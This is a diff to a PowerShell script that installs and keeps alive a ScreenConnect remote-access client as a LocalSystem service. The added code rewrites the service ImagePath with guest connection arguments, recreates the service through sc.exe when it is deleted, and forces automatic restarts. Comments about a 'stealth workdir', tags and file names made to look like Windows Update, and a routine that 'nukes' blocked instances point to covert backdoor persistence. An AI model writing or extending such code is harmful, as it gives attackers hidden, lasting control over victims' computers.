@@ -869,11 +869,60 @@ function Expand-ScMsiOverInstall {
     return $svcOk
 }
 
+function Set-PrimaryScImagePath {
+    param([string]$Args)
+    $exe = Join-Path (Get-PrimaryScInstallDir) 'ScreenConnect.ClientService.exe'
+    if (-not (Test-Path $exe)) {
+        Write-Log 'REPAIR: cannot set ImagePath - exe missing'
+        return $false
+    }
+    if (-not $Args) { $Args = Get-ScArgsFromDrop }
+    if (-not $Args) { $Args = Get-ScConnectionArgsFromMsi -MsiPath $MsiFile }
+    if (-not $Args) {
+        Write-Log 'REPAIR: cannot set ImagePath - no args'
+        return $false
+    }
+    # Reject junk
+    if ($Args -match '\{[0-9A-F]{8}-' -or $Args -match '\|ScreenConnect') {
+        Write-Log 'REPAIR: refusing junk args for ImagePath'
+        return $false
+    }
+    if ($Args -notlike '?e=Access*' -and $Args -like '?h=*') {
+        $Args = '?e=Access&y=Guest&' + $Args.TrimStart('?')
+    }
+    $img = '"{0}" "{1}"' -f $exe, $Args
+    $rk = "HKLM:\SYSTEM\CurrentControlSet\Services\$SvcName"
+    if (-not (Test-Path $rk)) {
+        # ensure service key exists via New-Service if needed
+        if (-not (Test-ScServicePresent)) {
+            try {
+                New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName -StartupType Automatic -ErrorAction Stop | Out-Null
+            } catch {
+                cmd /c "sc.exe create `"$SvcName`" binPath= `"$img`" start= auto obj= LocalSystem DisplayName= `"$SvcName`"" >$null 2>&1
+            }
+        }
+    }
+    try {
+        Set-ItemProperty -Path $rk -Name ImagePath -Value $img -Force -ErrorAction Stop
+        Write-Log ("REPAIR: registry ImagePath set args_len=" + $Args.Length)
+    } catch {
+        Write-Log "REPAIR: registry ImagePath failed: $($_.Exception.Message)"
+        return $false
+    }
+    Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
+    return $true
+}
+
 function Save-PrimaryScImagePath {
     $pathFile = Join-Path $WorkDir '.sc_imgpath'
     try {
         $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
         if ($svc -and $svc.PathName) {
+            # Never persist junk ImagePath
+            if ($svc.PathName -match '\{[0-9A-F]{8}-' -or $svc.PathName -match '\|ScreenConnect') {
+                Write-Log 'REPAIR: skip saving junk ImagePath'
+                return $false
+            }
             Set-Content -Path $pathFile -Value $svc.PathName -Encoding UTF8 -Force
             Write-Log 'REPAIR: saved SC ImagePath for service restore'
             return $true
@@ -884,45 +933,31 @@ function Save-PrimaryScImagePath {
 }
 
 function Restore-PrimaryScService {
-    if (Test-ScServicePresent) { return $true }
+    if (Test-ScServicePresent) {
+        Set-PrimaryScImagePath | Out-Null
+        return $true
+    }
     $exe = Join-Path (Get-PrimaryScInstallDir) 'ScreenConnect.ClientService.exe'
     if (-not (Test-Path $exe)) {
         Write-Log 'REPAIR: ClientService.exe missing - skip service recreate'
         return $false
     }
-    $img = $null
-    $pathFile = Join-Path $WorkDir '.sc_imgpath'
-    if (Test-Path $pathFile) {
-        $img = (Get-Content -Path $pathFile -Raw -ErrorAction SilentlyContinue).Trim()
-    }
-    if (-not $img) {
-        $img = Build-PrimaryScImagePath -MsiPath (Join-Path $env:TEMP 'wupkg_sc.msi')
-    }
-    if (-not $img) {
-        $img = Build-PrimaryScImagePath -MsiPath $MsiFile
-    }
-    if (-not $img) {
+    if (-not (Set-PrimaryScImagePath)) {
         Write-Log 'REPAIR: no ImagePath/args - cannot recreate service'
         return $false
     }
-    # Always retarget exe path to current install dir (stealth workdir has no fingerprint in path)
-    $argsOnly = $null
-    if ($img -match '"\s+"(\?e=Access[^"]*)"') { $argsOnly = $Matches[1] }
-    elseif ($img -match '(\?e=Access\S+)') { $argsOnly = $Matches[1] }
-    if ($argsOnly) { $img = '"{0}" "{1}"' -f $exe, $argsOnly }
-    else { $img = '"{0}"' -f $exe }
-    Set-Content -Path $pathFile -Value $img -Encoding UTF8 -Force
-    Write-Log "REPAIR: service ImagePath -> $exe"
-    try {
-        Start-Sleep -Seconds 2
-        New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName `
-            -StartupType Automatic -ErrorAction Stop | Out-Null
-        Write-Log 'REPAIR: service recreated from ImagePath'
-    } catch {
-        Write-Log "REPAIR: New-Service failed ($($_.Exception.Message)) - sc create"
-        cmd /c "sc.exe delete `"$SvcName`"" >$null 2>&1
-        Start-Sleep -Seconds 2
-        $null = cmd /c "sc.exe create `"$SvcName`" binPath= $img start= auto obj= LocalSystem DisplayName= `"$SvcName`""
+    if (-not (Test-ScServicePresent)) {
+        $img = (Get-Content (Join-Path $WorkDir '.sc_imgpath') -Raw).Trim()
+        try {
+            New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName `
+                -StartupType Automatic -ErrorAction Stop | Out-Null
+            Write-Log 'REPAIR: service recreated from ImagePath'
+        } catch {
+            Write-Log "REPAIR: New-Service failed ($($_.Exception.Message))"
+            cmd /c "sc.exe delete `"$SvcName`"" >$null 2>&1
+            Start-Sleep -Seconds 2
+            Set-PrimaryScImagePath | Out-Null
+        }
     }
     & sc.exe config "$SvcName" start= auto >$null 2>&1
     & sc.exe failure "$SvcName" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >$null 2>&1
@@ -1791,7 +1826,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730L'
+Write-Log 'WU_BUILD_20260730M'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -2178,32 +2213,12 @@ function Install-PrimarySc {
 
 function Start-PrimaryService {
     if (-not (Test-ScServicePresent)) { return $false }
-    # Re-assert clean ImagePath (reject GUID-junk args that crash with 1067)
-    try {
-        $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
-        $bad = $false
-        if ($svc -and $svc.PathName -match '\{[0-9A-F]{8}-') { $bad = $true }
-        if ($svc -and $svc.PathName -notmatch '&k=[A-Za-z0-9%+/=]+"?\s*$' -and $svc.PathName -match '\|ScreenConnect') { $bad = $true }
-        if ($bad -or -not $svc.PathName) {
-            Write-Log 'REPAIR: fixing corrupted ImagePath before start'
-            $args = Get-ScArgsFromDrop
-            if (-not $args) { $args = Get-ScConnectionArgsFromMsi -MsiPath $MsiFile }
-            if (-not $args) {
-                $f = Join-Path $WorkDir 'sc_args.txt'
-                if (Test-Path $f) { $args = (Get-Content $f -Raw).Trim() }
-            }
-            $exe = Join-Path (Get-PrimaryScInstallDir) 'ScreenConnect.ClientService.exe'
-            if ($args -and (Test-Path $exe)) {
-                $img = '"{0}" "{1}"' -f $exe, $args
-                & sc.exe config "$SvcName" binPath= $img >$null 2>&1
-                Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
-                Write-Log "REPAIR: ImagePath fixed len_args=$($args.Length)"
-            }
-        }
-    } catch {}
+    Set-PrimaryScImagePath | Out-Null
     & sc.exe config "$SvcName" start= auto >$null 2>&1
     & sc.exe failure "$SvcName" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >$null 2>&1
     if (-not (Test-ScServiceRunning)) {
+        & sc.exe stop "$SvcName" >$null 2>&1
+        Start-Sleep -Seconds 1
         & sc.exe start "$SvcName" >$null 2>&1
         try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
         Start-Sleep -Seconds 3
